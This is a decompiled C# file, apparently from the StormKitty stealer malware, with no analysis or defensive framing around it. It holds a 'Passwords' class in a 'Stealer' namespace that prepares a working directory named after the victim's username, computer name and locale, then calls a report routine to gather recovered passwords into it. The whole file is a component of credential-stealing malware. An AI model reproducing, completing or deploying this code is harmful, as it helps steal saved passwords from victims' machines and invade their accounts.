using System;
using System.IO;
using StormKitty;

namespace Stealer
{
	// Token: 0x02000010 RID: 16
	internal sealed class Passwords
	{
		// Token: 0x06000056 RID: 86 RVA: 0x00003FFC File Offset: 0x000021FC
		public static string Save()
		{
			Console.WriteLine("Running passwords recovery...");
			if (!Directory.Exists(Passwords.PasswordsStoreDirectory))
			{
				Directory.CreateDirectory(Passwords.PasswordsStoreDirectory);
			}
			else
			{
				try
				{
					Filemanager.RecursiveDelete(Passwords.PasswordsStoreDirectory);
				}
				catch
				{
					Console.WriteLine("Failed recursive remove directory");
				}
			}
			if (Report.CreateReport(Passwords.PasswordsStoreDirectory))
			{
				return Passwords.PasswordsStoreDirectory;
			}
			return "";
		}

		// Token: 0x0400004E RID: 78
		private static string PasswordsStoreDirectory = Path.Combine(Paths.InitWorkDir(), string.Concat(new string[]
		{
			SystemInfo.username,
			"@",
			SystemInfo.compname,
			"_",
			SystemInfo.culture
		}));
	}
}
